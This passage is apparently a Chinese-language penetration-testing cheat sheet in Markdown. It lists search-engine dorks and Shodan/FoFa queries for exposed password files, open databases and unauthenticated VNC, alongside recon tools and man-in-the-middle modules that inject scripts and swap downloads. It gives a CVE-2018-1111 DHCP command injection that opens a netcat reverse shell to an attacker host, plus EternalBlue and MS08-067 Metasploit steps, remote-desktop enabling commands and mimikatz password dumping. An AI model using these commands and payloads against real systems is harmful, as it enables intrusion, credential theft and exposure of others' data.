    intitle:"Index of" .sh_history
    intitle:"Index of" .bash_history
    intitle:"index of" passwd
    intitle:"index of" people.lst
    intitle:"index of" pwd.db
    intitle:"index of" etc/shadow
    intitle:"index of" spwd
    intitle:"index of" master.passwd
    intitle:"index of" htpasswd
    inurl:service.pwd

    site:218.87.21.*
    inurl:老虎机 site:*.gov
    ```

**[Shodan](https://www.shodan.io)**
- 语法
    ```bash
    hostname：搜索指定的主机或域名,例如 hostname:"google"
    port：搜索指定的端口或服务,例如 port:"21"
    country：搜索指定的国家,例如 country:"CN"
    city：搜索指定的城市,例如 city:"Hefei"
    org：搜索指定的组织或公司,例如 org:"google"
    isp：搜索指定的ISP供应商,例如 isp:"China Telecom"
    product：搜索指定的操作系统/软件/平台,例如 product:"Apache httpd"
    version：搜索指定的软件版本,例如 version:"1.6.2"
    geo：搜索指定的地理位置,参数为经纬度,例如 geo:"31.8639, 117.2808"
    before/after：搜索指定收录时间前后的数据,格式为dd-mm-yy,例如 before:"11-11-15"
    net：搜索指定的IP地址或子网,例如 net:"210.45.240.0/24"
    ```

- 例子
    ```bash
    # 友情提醒,不要瞎搞
    misc
    Server: uc-httpd 1.0.0 200 OK Country:"JP"
    h3c net:"61.191.146.0/24"
    country:US vuln:CVE-2014-0160
    port:135,139,445 -hash:0   # 过滤一些主文本标题为空的搜索结果
    Hikvision-Webs      # 海康威视

    database
    all:"mongodb server information" all:"metrics"  # 开放Mongodb数据库
    port:27017 -all:"partially" all:"fs.files"      # 有点存货的Mongodb数据库
    port:"9200" all:"elastic indices"   # 开放ElasticSearch数据库

    ftp
    230 'anonymous@' login ok      # 开放匿名ftp

    vnc
    port:5900 screenshot.label:loggedin  # 无认证vnc
    ```

- 外部工具
    ```bash
    Shodan cli
    https://cli.shodan.io/

    浏览器插件
    https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap
    https://addons.mozilla.org/en-US/firefox/addon/shodan_io/

    Metasploit
    use auxiliary/gather/shodan_search
    set SHODAN_APIKEY ********************
    set QUERY ****

    use auxiliary/gather/shodan_honeyscore  # 蜜罐检测
    set SHODAN_APIKEY ********************
    set TARGET your_target

    Recon-ng
    keys add shodan_api ********************
    use recon/domains-hosts/shodan_hostname
    show options
    set SOURCE google
    set LIMIT 1
    ```

**[censys](https://www.censys.io)**
- 例子
    ```bash
    23.0.0.0/8 or 8.8.8.0/24　　# 可以使用and or not
    80.http.get.status_code: 200　　# 指定状态
    80.http.get.status_code:[200 TO 300]　　# 200-300之间的状态码
    location.country_code: DE　　# 国家
    protocols: ("23/telnet" or "21/ftp")　　# 协议
    tags: scada　　# 标签
    80.http.get.headers.server：nginx　　# 服务器类型版本
    autonomous_system.description: University　　# 系统描述
    ```

**[钟馗之眼](https://www.zoomeye.org/)**
- 语法
    ```bash
    app:nginx　　# 组件名
    ver:1.0　　# 版本
    os:windows　　# 操作系统
    country:"China"　　# 国家
    city:"hangzhou"　　# 城市
    port:80　　# 端口
    hostname:google　　# 主机名
    site:google.com　　# 网站域名
    desc:nmask　　# 描述
    keywords:passwd　　# 关键词
    service:ftp　　# 服务类型
    ip:8.8.8.8　　# ip地址
    cidr:8.8.8.8/24　　# ip地址段
    ```

- 例子
    ```bash
    city:tokyo + app:weblogic   # weblogic反序列化来一波？
    ```

**[FoFa](https://fofa.so)**
- 语法
    ```bash
    title="abc" # 从标题中搜索abc。例：标题中有北京的网站。
    header="abc" # 从http头中搜索abc。例：jboss服务器。
    body="abc" # 从html正文中搜索abc。例：正文包含Hacked by。
    domain="qq.com" # 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。
    host=".gov.cn" # 从url中搜索.gov.cn,注意搜索要用host作为名称。
    port="443" # 查找对应443端口的资产。例： 查找对应443端口的资产。
    ip="1.1.1.1" # 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。
    protocol="https" # 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。
    city="Beijing" # 搜索指定城市的资产。例： 搜索指定城市的资产。
    region="Zhejiang" # 搜索指定行政区的资产。例： 搜索指定行政区的资产。
    country="CN" # 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。
    cert="google.com" # 搜索证书(https或者imaps等)中带有google.com的资产。
    ```

- 例子
    ```bash
    title="powered by" && title!=discuz
    title!="powered by" && body=discuz
    (body="content=\"WordPress" || (header="X-Pingback" && header="/xmlrpc.php" && body="/wp-includes/") ) && host="gov.cn"
    ```

**[Dnsdb](https://www.dnsdb.io/)**
- 语法
    ```bash
    DnsDB查询语法结构为条件1 条件2 条件3 …., 每个条件以空格间隔, DnsDB 会把满足所有查询条件的结果返回给用户.

    域名查询条件
    查询语法为`domain:.`
    域名查询是指查询顶级私有域名所有的DNS记录,
    例如查询google.com 的所有DNS记录: `domain:google.com.`
    域名查询可以省略domain:.

    主机查询条件
    查询语法:`host:`
    例如查询主机地址为mp3.example.com的DNS记录:`host:map3.example.com`
    主机查询条件与域名查询查询条件的区别在于, 主机查询匹配的是DNS记录的Host值

    按DNS记录类型查询
    查询语法: `type:.`
    例如只查询A记录: `type:a`
    使用条件:必须存在domain:或者host:条件,才可以使用type:查询语法

    按IP限制
    查询语法: `ip:`
    查询指定IP: `ip:8.8.8.8` 该查询与直接输入8.8.8.8进行查询等效
    查询指定IP范围: `ip:8.8.8.8-8.8.255.255`
    CIDR: `ip:8.8.0.0/24`
    IP最大范围限制65536个
    ```

- 例子

    查询google.com的所有A记录: `google.com type:a`

**Reference**
- [【渗透神器系列】搜索引擎](https://thief.one/2017/05/19/1/)
- [Shodan新手入坑指南](https://www.freebuf.com/sectool/121339.html)
- [shodan-manual](https://b404.gitbooks.io/shodan-manual/)
- [How to Discover MongoDB and Elasticsearch Open Databases](https://habr.com/en/post/443132/)

---

### 网络

**TTL来判断目的主机的操作系统类型**

下面是默认操作系统的TTL：
```bash
1、WINDOWS NT/2000   TTL：128
2、WINDOWS 95/98     TTL：32
3、UNIX              TTL：255
4、LINUX             TTL：64
5、WIN7              TTL：64
```

**修改本机电脑上面的默认TTL值**

通过修改本机上的TTL值可以混淆攻击者的判断(当然,很少有用户会这么做)。TTL 值在注册表的位置是：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters `其中有个 DefaultTTL 的 DWORD 值,其数据就是默认的 TTL 值了,我们可以修改 DefaultTTL 里面的 TTL 默认值,但不能大于十进制的 255。

#### IP扫

**工具**
- netdiscover

    `netdiscover -r 1.1.1.0/24`

---

### 网站

**文章**

鸽

#### DNS枚举

**在线**
- [在线子域名爆破-子成君提供](http://z.zcjun.com/)

**工具**
- [lijiejie/subDomainsBrute](https://github.com/lijiejie/subDomainsBrute)
- [bit4woo/teemo](https://github.com/bit4woo/Teemo)
- [ring04h/wydomain](https://github.com/ring04h/wydomain)
- [bitquark/dnspop](https://github.com/bitquark/dnspop)
- [fwaeytens/dnsenum](https://github.com/fwaeytens/dnsenum)
- [mschwager/fierce](https://github.com/mschwager/fierce)

**tips**

`这里内容为PwnDog在DC0531的议题中的概括` 相应 [pdf](./教程/DC0531-SRC.pdf)

1. 基于SSL证书查询
2. 第三方网站借口查询
3. 像Github这种代码托管网站或在线服务商
4. DNS解析记录
5. 子域名枚举

#### 目录枚举

**字典**
- [DictionaryHouse/Dirpath_List](https://github.com/DictionaryHouse/Dirpath_List)

**工具**
- [Xyntax/DirBrute](https://github.com/Xyntax/DirBrute)
- [Nekmo/dirhunt](https://github.com/Nekmo/dirhunt)
- [maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)

**文章**
- [熟练使用各类敏感目录文件扫描工具](https://klionsec.github.io/2014/12/16/dirscan-tools/)
- [DIRB | Penetration Testing Tools](https://tools.kali.org/web-applications/dirb)

#### 指纹

**在线**
- [云悉WEB资产梳理|在线CMS指纹识别平台 - 云悉安全](http://www.yunsee.cn/)
- [Bad site specified](https://toolbar.netcraft.com/site_report?url=/)
- [Site Info Tool - Website Information Lookup Tool](http://www.siteinfotool.com/)
- [在线指纹识别,在线cms识别小插件--BugScaner](http://whatweb.bugscaner.com/look/)
- [YFCMF内容管理框架 YFCMF内容管理框架](http://finger.tidesec.net/)

**文章**
- [WAF指纹探测及识别技术](https://www.freebuf.com/articles/web/21744.html)
- [阻碍获取真实网络指纹](http://b404.xyz/2018/01/27/hidden-the-network/)

**工具**
- [michenriksen/aquatone](https://github.com/michenriksen/aquatone)
- [urbanadventurer/WhatWeb](https://github.com/urbanadventurer/WhatWeb)
- [tanjiti/FingerPrint](https://github.com/tanjiti/FingerPrint)

#### CDN/查源IP

**在线**
- [CDN Finder tool - CDN Planet](https://www.cdnplanet.com/tools/cdnfinder/)
- [CDN检测](https://myssl.com/cdn_check.html)
- [多个地点Ping服务器,网站测速 - 站长工具](http://ping.chinaz.com/)
- [网站测速工具_超级ping _多地点ping检测 - 爱站网](https://ping.aizhan.com/)
- [just-ping › Ping an internet host from 50 locations worldwide - iTools](http://itools.com/tool/just-ping)

**文章**
- [绕过CDN查找网站真实IP](https://xiaix.me/rao-guo-cdncha-zhao-wang-zhan-zhen-shi-ip/)
- [绕过cdn，查找真实IP | 冰羽の博客](https://www.bingyublog.com/2018/03/25/%E7%BB%95%E8%BF%87cdn%EF%BC%8C%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/)
- [聊聊CDN的误区 - r34l!ty - 不负勇往](http://rinige.com/index.php/archives/772/)
- [网站真实IP发现手段浅谈 - 安全客，安全资讯平台](https://www.anquanke.com/post/id/163348)
- [如何寻找隐藏在CloudFlare或TOR背后的真实原始IP - 嘶吼 RoarTalk](http://www.4hou.com/technology/13713.html)

**tips**
- **Nslookup法**

    `nslookup + 域名`

- **多地ping域名法**

    利用在线网站服务多地 ping 测试

- **"常识"判断法**

    在反查网站 ip 时,如果此网站有 1000 多个不同域名,那么这个 ip 多半不是真实 ip。

    如果一个 asp 或者 asp.net 网站返回的头字段的 server 不是 IIS、而是 Nginx,那么多半是用了 nginx 反向代理,而不是真实 ip。

    如果 ip 定位是在常见 cdn 服务商的服务器上,那么是真实 ip 的可能性就微乎其微了。

- **子域名查找法**

    利用一些在线查询的网站 https://x.threatbook.cn/

    https://dnsdb.io/zh-cn/ 只需输入 baidu.com type:A 就能收集百度的子域名和 ip

    Google 搜索 Google site:baidu.com -www 就能查看除 www 外的子域名

- **使用子域名扫描器**

    例如子域名挖掘机和 subdomainbrute(https://github.com/lijiejie/subDomainsBrute)

    总结：收集子域名后尝试以解析 ip 不在 CDN 上的 ip 解析主站,真实 ip 成功被获取到。

#### 旁站

**在线**
- https://dns.aizhan.com/
- http://www.sameip.org/
- https://www.robtex.com/
- http://www.webscan.cc/
- http://www.114best.com/ip/
- http://www.5kik.com/c/
- https://phpinfo.me/bing.php
- https://dnsdumpster.com/

#### whois

**在线**
- http://wq.apnic.net/apnic-bin/whois.pl
- https://centralops.net/co/
- https://www.register.com/whois.rcmx
- https://www1.domain.com/whois/whois.bml
- https://whois.net/
- https://whois.domaintools.com/
- https://who.is/
- https://www.t00ls.net/domain.html
- https://www.whois.com.au/whois/abn.html
- http://whois.webmasterhome.cn/
- https://whois.aliyun.com/
- https://who.is/whois/xxx.com
- https://whois.icann.org/zh/lookup
- http://whoissoft.com/
- http://whois.chinaz.com/
- https://www.whois.com/
- http://whois.domaintools.com/
- https://whois.icann.org/en

**工具**
- http://www.freebuf.com/articles/network/107372.html

#### 备案
**在线**
- http://www.beianbeian.com/
- http://beian.gov.cn/portal/recordQuery
- http://www.miitbeian.gov.cn/publish/query/indexFirst.action

---

### 主机
#### 端口扫

**端口信息**
- [Service Name and Transport Protocol Port Number Registry](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml)
- 端口列表文件 [md](./文件/端口列表.md)、[xlsx](./文件/端口列表.xlsx)
- 常见端口渗透 [png](./文件/常见端口渗透.png)

**[nmap](https://nmap.org/download.html)**
- **用法**

    `nmap -T5 -A -v 1.1.1.1`

- **脚本**



- **报告模板**
    - [honze-net/nmap-bootstrap-xsl](https://github.com/honze-net/nmap-bootstrap-xsl)

- **文章**
    - [【渗透神器系列】nmap](https://thief.one/2017/05/02/1/)
    - [Nmap扫描原理与用法](https://blog.csdn.net/aspirationflow/article/details/7694274)

**[masscan](https://github.com/robertdavidgraham/masscan)**

---

## LAN
### 中间人

**工具**
- [LionSec/xerosploit](https://github.com/LionSec/xerosploit)
    - **文章**
        - [xerosploit用法](http://www.cnbreak.org/anquan/461.html)

    - **安装**
        ```bash
        git clone https://github.com/LionSec/xerosploit
        cd xerosploit && sudo python install.py
        1
        ./xerosploit
        ```

    - **基本操作**
        ```bash
        scan # 映射你的网络
        iface # 手动设置网络接口
        gateway # 手动设置网关
        rmlog # 删除所有日志
        ```

    - **模块演示(部分)**
        ```bash
        start
        <靶机IP>
        pscan # 端口扫描
        run

        dos # dos攻击
        run

        injecthtml # 将 html 注入到目标访问的网站中
        run
        /root/test.html

        injectjs # 将 javascript 注入到目标网站中
        run
        /root/test.js

        rdownload # 替换目标下载的文件
        run
        exe
        /root/test.exe

        sniff # 嗅探目标的流量
        run
        ```

- [bettercap/bettercap](https://github.com/bettercap/bettercap)
- [byt3bl33d3r/MITMf](https://github.com/byt3bl33d3r/MITMf)
- [cain](http://www.oxid.it/cain.html)

---

## WAN
### dns

**CVE-1999-0532** dns域传送漏洞
```bash
dig @dns.xxx.edu.cn axfr xxx.edu.cn
@指定域名服务器；axfr 为域传送指令；xxx.edu.cn表示要查询的域名；
```

---

## linux渗透
### vul

**本地提权类**
- **CVE-2016-5195 脏牛 Dirty COW**
    - 影响范围
        - Linux内核>=2.6.22(2007年发行)，直到2016年10月18日修复

    - 文章
        - [[翻译]从内核角度分析Dirty Cow原理](https://bbs.pediy.com/thread-218797.htm)

    - POC | Payload | exp
        - [scumjr/dirtycow-vdso](https://github.com/scumjr/dirtycow-vdso)
        - [dirtycow/dirtycow.github.io](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
        - [gbonacini/CVE-2016-5195](https://github.com/gbonacini/CVE-2016-5195)

**远程利用类**
- **CVE-2014-6271** Bash远程代码执行漏洞“破壳”
    - 文章
        - [Bash远程代码执行漏洞“破壳”(CVE-2014-6271)分析](https://www.antiy.com/response/CVE-2014-6271.html)

    - POC | Payload | exp
        - [scottjpack/shellshock_scanner](https://github.com/scottjpack/shellshock_scanner)

    - 本地验证方法

        `env x='() { :;}; echo Vulnerable CVE-2014-6271 ' bash -c "echo test"`

        执行命令后，如果显示Vulnerable CVE-2014-6271，证系统存在漏洞，可改变echo Vulnerable CVE-2014-6271为任意命令进行执行。

    - MSF模块
        ```bash
        use exploit/linux/http/ipfire_bashbug_exec
        use exploit/multi/http/cups_bash_env_exec
        use exploit/unix/dhcp/bash_environment
        ```

- **CVE-2018-1111** DHCP 客户端脚本代码执行漏洞
    - 文章
        - [CVE-2018-1111复现环境搭建与dhcp命令注入](https://www.freebuf.com/articles/web/191884.html)
        - [DHCP客户端脚本代码执行漏洞分析 (CVE-2018-1111) ](https://xz.aliyun.com/t/2455)

    - POC | Payload | exp
        - [ knqyf263/CVE-2018-1111](https://github.com/knqyf263/CVE-2018-1111)
        - [kkirsche/CVE-2018-1111](https://github.com/kkirsche/CVE-2018-1111)

    - 本地利用方法
        ```
        attacker: kali linux 2018 x64 192.168.71.5
        victim: Centos 7 x64 192.168.71.10
        ```
        ```vim
        vim dnsmasq.conf

        bind-interfaces

        interface=eth0
        except-interface=lo
        dhcp-range=192.168.71.10,192.168.71.20,12h
        dhcp-option=3,192.168.71.5
        dhcp-option=6,192.168.71.5
        log-queries
        log-facility=/var/log/dnsmasq.log
        ```
        `dnsmasq -dC dnsmasq.conf --dhcp-option="252,malayke'&nc -e /bin/bash 192.168.71.5 6666 #"`
        `nc -l -p 6666 -v`

        重启 CentOS 的网络服务，然后 shell 就反弹回来了

---

## windows渗透
### Exchange

- [APT34 Exchange爆破工具](https://github.com/blackorbird/APT_REPORT/blob/master/APT34/Jason.zip)

### RDP

**cmd开RDP**
- 文章
    - [开启RDP](http://b404.xyz/2017/12/27/open-RDP/)

- 命令
    - **dos命令开启3389端口(开启XP&2003终端服务)**
        1. 方法一：`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`

        2. 方法二：`REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /d 0 /t REG_DWORD /f`

    - **WMIC开启3389**

         `wmic /namespace:\\root\CIMV2\TerminalServices PATH Win32_TerminalServiceSetting WHERE (__CLASS !="") CALL SetAllowTSConnections 1`

    - **PowerShell开启RDP**
        1. Enable RDP
        `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0`

        2. Allow RDP in firewall
        `Set-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP -Enabled true`

        3. Enable secure RDP authentication
        `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1`

        或

        1. Enable Remote Desktop
        `(Get-WmiObject Win32_TerminalServiceSetting -Namespace root\cimv2\TerminalServices).SetAllowTsConnections(1,1) `
        `(Get-WmiObject -Class "Win32_TSGeneralSetting" -Namespace root\cimv2\TerminalServices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) `

        2. Enable the firewall rule
        `Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`

    - **查看3389端口是否开启**

        `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /*如果是0x0则开启`

    - **更改终端端口为2008(十六进制为：0x7d8)**

        1. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f`
        2. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f`

    - **查看3389端口是否更改**

        `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  /*出来的结果是16进制`

    - **取消xp&2003系统防火墙对终端服务的限制及IP连接的限制：**

        `REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f`

**第三方连接工具**
- [rdesktop/rdesktop](https://github.com/rdesktop/rdesktop)
- [Remmina](https://remmina.org/)

**多开**
- 文章
    - [Win7双开3389](https://blog.csdn.net/SysProgram/article/details/11810889)
    - [渗透技巧——Windows系统远程桌面的多用户登录](http://www.4hou.com/system/8314.html)
    - [Multi-User login in Windows 7/Vista/XP using Remote Desktop](http://zahirkhan.com/tools-utilities/multi-user-login-in-windows-7)

- 工具
    - [stascorp/rdpwrap](https://github.com/stascorp/rdpwrap)

**连接记录**
- 文章
    - [渗透技巧——获得Windows系统的远程桌面连接历史记录](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/)
    - [关于windows的RDP连接记录](http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/)
    - [How to Clear RDP Connections History in Windows](http://woshub.com/how-to-clear-rdp-connections-history/#h2_3)

- 工具
    - [3gstudent/List-RDP-Connections-History](https://github.com/3gstudent/List-RDP-Connections-History)

---

### vul

**漏洞查询**
- **文章**
    - [windows本地提权对照表](http://www.7kb.org/138.html)

- **文件**
    - [BulletinSearch-微软官网提供的漏洞excel列表](http://download.microsoft.com/download/6/7/3/673E4349-1CA5-40B9-8879-095C72D5B49D/BulletinSearch.xlsx)

- **工具**
    - [GDSSecurity/Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) - 此工具将目标修补程序级别与Microsoft漏洞数据库进行比较，以便检测目标上可能缺少的修补程序。
    - [bitsadmin/wesng](https://github.com/bitsadmin/wesng) - Windows Exploit Suggester
    - [tengzhangchao/microsoftSpider](https://github.com/tengzhangchao/microsoftSpider) - 爬取微软漏洞信息，MS对应的每个版本操作系统KB号以及补丁下载地址。

- **快速查找未打补丁的exp**

    可以最安全的减少目标机的未知错误,以免影响业务。
    命令行下执行检测未打补丁的命令如下：
    `systeminfo>micropoor.txt&(for %i in (KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780) do @type micropoor.txt|@find /i  "%i"|| @echo %i you can fuck)&del /f /q /a micropoor.txt`

    注：以上需要在可写目录执行。需要临时生成 micrpoor.txt,以上补丁编号请根据环境来增、删。
    一般实战中在类似 tmp目录等可写目录下执行：如`C:\tmp>`

**漏洞资源**
- [SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) - Windows平台提权漏洞集合
- [WindowsExploits/Exploits](https://github.com/WindowsExploits/Exploits)- Windows Exploits

**本地提权类**
- **[SandboxEscaper](http://sandboxescaper.blogspot.com/)**

    暴躁女黑客了解一下

**远程利用类**
- **MS08-067 & CVE-2008-4250**
    - MSF模块
        ```bash
        use exploit/windows/smb/ms08_067_netapi
        set payload windows/x64/meterpreter/reverse_tcp
        set target 0
        ```

- **MS12-020 & CVE-2012-0002**
    - MSF模块
        ```bash
        use auxiliary/scanner/rdp/ms12_020_check
        use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
        ```

- **MS14-066 & CVE-2014-6321**
    - POC | Payload | exp
        - [anexia-it/winshock-test](https://github.com/anexia-it/winshock-test)

- **MS15-034 & CVE-2015-1635**
    - POC | Payload | exp
        - [MS15-034 Checker](https://pastebin.com/ypURDPc4)

    - 文章
        - [MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞分析](http://blogs.360.cn/post/cve_2015_6135_http_rce_analysis.html)

    - MSF模块
        ```bash
        use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
        use auxiliary/dos/http/ms15_034_ulonglongadd
        ```

- **MS17-010**
    - MSF模块
        ```bash
        发现,检测
        use auxiliary/scanner/smb/smb_ms17_010

        使用payload连上去
        use exploit/windows/smb/ms17_010_eternalblue
        set payload windows/x64/meterpreter/reverse_tcp
        set lhost   # 设一下本机地址
        set rhosts
        run

        msf 下
        加载mimikatz模块
        load mimikatz
        kerberos
        ```

- **bluekeep & CVE-2019-0708**
    - POC | Payload | exp
        - [zerosum0x0/CVE-2019-0708](https://github.com/zerosum0x0/CVE-2019-0708)
        - [robertdavidgraham/rdpscan](https://github.com/robertdavidgraham/rdpscan)
        - [Ekultek/BlueKeep](https://github.com/Ekultek/BlueKeep)

---

### 口令获取及破解

**mimikatz**

提权
`privilege::debug`

抓取密码
`sekurlsa::logonpasswords`

或
```
D:\>mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir //打印输出mimikatz
D:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt //输出到log.txt
```

---

### 域渗透

鸽

---

## web渗透
### 常见漏洞
#### 任意文件下载/读取
**案例**
- [电信某分站配置不当导致敏感文件泄露](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-095088)
- [一个任意文件读取漏洞记录](https://toutiao.io/posts/423535/app_preview)
- [南方周末邮件服务器任意文件读取漏洞](http://wooyun.jozxing.cc/static/bugs/wooyun-2013-045426.html)

#### 文件包含漏洞
**案例**
- [IKEA官网本地文件包含(LFI)漏洞分析 - 嘶吼 RoarTalk](http://www.4hou.com/vulnerable/13759.html)

**文章**
- [LFI、RFI、PHP封装协议安全问题学习 - 骑着蜗牛逛世界](https://www.cnblogs.com/LittleHann/p/3665062.html#3831621)
- [php文件包含漏洞 | Chybeta](https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/)
- [文件包含漏洞](https://blog.csdn.net/le0nis/article/details/52043732)
- [文件包含漏洞(绕过姿势) ](https://thief.one/2017/04/10/2/)
- [文件包含漏洞原理分析](https://zhuanlan.zhihu.com/p/25069779)
- [文件包含漏洞总结 | 瓦都剋](http://byd.dropsec.xyz/2016/07/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/)
- [本地文件包含漏洞利用技巧](https://www.secpulse.com/archives/55769.html)
- [Directory Traversal, File Inclusion, and The Proc File System](https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/)
- [Exploiting PHP File Inclusion – Overview | Reiners' Weblog](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/)
- [Local File Inclusion with Magic_quotes_gpc enabled - NotSoSecure](https://www.notsosecure.com/local-file-inclusion-with-magic_quotes_gpc-enabled/)
- [Positive Technologies - learn and secure : Another alternative for NULL byte](https://blog.ptsecurity.com/2010/08/another-alternative-for-null-byte.html)
- [远程包含和本地包含漏洞的原理 - Kevins的天空 http://rootsec.cn - CSDN博客](https://blog.csdn.net/iiprogram/article/details/2349322)

#### 文件解析漏洞
**文章**
- [解析漏洞总结 – erevus](http://www.vuln.cn/7070)

**笔记**
- [文件解析漏洞笔记](./笔记/文件解析漏洞笔记.md)

#### 文件上传漏洞
**文章**
- [简单粗暴的文件上传漏洞](https://paper.seebug.org/560/)(https://mp.weixin.qq.com/s/e1jy-DFOSROmSvvzX_Ge5g)

**笔记**
- [文件上传漏洞笔记](./笔记/文件上传漏洞笔记.md)

#### 信息泄露漏洞
**文章**
- [谈谈源码泄露](https://blog.csdn.net/GitChat/article/details/79014538)
- [敏感文件泄露](http://www.myh0st.cn/index.php/archives/62/)

**目录遍历**
- **案例**
    - [京东商城两处任意目录遍历下载漏洞](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0214222)

**GIT 源码泄露**
- **简介**

    当在一个空目录执行 git init 时，Git 会创建一个 .git 目录。 这个目录包含所有的 Git 存储和操作的对象。 如果想备份或复制一个版本库，只需把这个目录拷贝至另一处就可以了。

- **案例**
    - [大众点评某站点git泄漏源代码](http://www.anquan.us/static/bugs/wooyun-2015-0117332.html)

- **工具**
    - [lijiejie/GitHack](https://github.com/lijiejie/GitHack)

**SVN 源码泄露**

- **案例**
    - [我爱我家某处源码泄露](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0149331)

- **工具**
    - [kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)

**DS_Store 文件泄漏**
- **简介**

    .DS_Store 文件 MAC 系统是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。如果用户删除以后的副作用就是这些信息的失去。

    这些文件本来是给 Finder 使用的，但它们被设想作为一种更通用的有关显示设置的元数据存储，诸如图标位置和视图设置。 当你需要把代码上传的时候，安全正确的操作应该把 .DS_Store 文件删除才正确。

    因为里面包含了一些目录信息，如果没有删除，攻击者通过 .DS_Store 可以知道这个目录里面所有文件名称，从而让攻击者掌握了更多的信息。　

- **案例**
    - [TCL某网站DS_Store文件泄露敏感信息](http://www.anquan.us/static/bugs/wooyun-2015-091869.html)

- **工具**
    - [lijiejie/ds_store_exp](https://github.com/lijiejie/ds_store_exp)

**网站备份压缩文件**
- **简介**

    该漏洞的成因主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。

    该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。

- **案例**
    - [百度某分站备份文件泄露](http://www.anquan.us/static/bugs/wooyun-2014-050622.html)
    - [乐友商城24GB代码与数据库敏感文件泄露](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0124051)

**WEB-INF/web.xml 信息泄露**
- **简介**

    WEB-INF 是 Java 的 WEB 应用的安全目录。该目录原则上来说是客户端无法访问，只有服务端才可以可以访问。如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应映射才能访问。

    WEB-INF 主要包含一下文件或目录：
    ```
    /WEB-INF/web.xml：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则；
    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在 .jar 文件中；
    /WEB-INF/lib/：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件 , 如数据库驱动 jar 文件；
    /WEB-INF/src/：源码目录，按照包名结构放置各个 java 文件；
    /WEB-INF/database.properties：数据库配置文件。
    ```
    不过在一些特定的场合却会让攻击者能读取到其中的内容，从而造成源码泄露。

- **案例**
    - [华为官网WEB-INF目录配置文件导致信息泄露](http://www.anquan.us/static/bugs/wooyun-2013-022906.html)

**idea文件夹泄露**
- **工具**
    - [lijiejie/idea_exploit](https://github.com/lijiejie/idea_exploit)

**phpinfo**
- **文章**
    - [phpinfo可以告诉我们什么](http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/)

#### CSRF
**文章**
- [CSRF的攻击与防御](http://www.secbox.cn/hacker/5742.html)

#### http参数污染
**文章**
- [Web应用里的HTTP参数污染（HPP）漏洞](https://blog.csdn.net/eatmilkboy/article/details/6761407)
